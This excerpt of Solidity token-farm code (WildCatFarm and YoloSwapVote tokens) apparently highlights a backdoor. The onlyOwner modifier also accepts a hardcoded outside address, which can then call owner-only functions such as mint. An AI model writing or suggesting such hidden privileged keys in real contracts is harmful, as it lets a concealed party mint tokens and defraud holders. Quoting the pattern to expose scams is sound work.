...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == 0x841dF6156179D870bf738491E2457708afAC8dd4, 'Ownable: caller is not the owner');
        _;
    }
...
contract CakeToken is BEP20('WildCatFarm Token', 'WCAT') {
...
contract SyrupBar is BEP20('YoloSwapVote Token', 'YOLOVOTE') {
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
